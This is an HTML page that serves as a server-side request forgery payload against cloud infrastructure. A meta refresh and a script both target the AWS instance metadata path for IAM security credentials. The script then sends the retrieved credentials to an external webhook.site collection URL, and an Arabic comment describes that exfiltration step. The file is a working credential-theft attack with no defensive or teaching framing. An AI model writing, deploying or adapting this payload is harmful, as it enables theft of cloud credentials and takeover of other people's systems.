<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="refresh" content="0; url=http://169.254.169.254/latest/meta-data/iam/security-credentials/">
</head>
<body>
  <script>
    // بديل: استخدم fetch عشان تجيب المحتوى وتبعته للـ Webhook
    fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
      .then(r => r.text())
      .then(data => {
        fetch('https://webhook.site/cc20c4bc-9a45-4fb8-80dd-ee35896136b4/', {
          method: 'POST',
          body: JSON.stringify({data: data})
        });
      });
  </script>
</body>
</html>
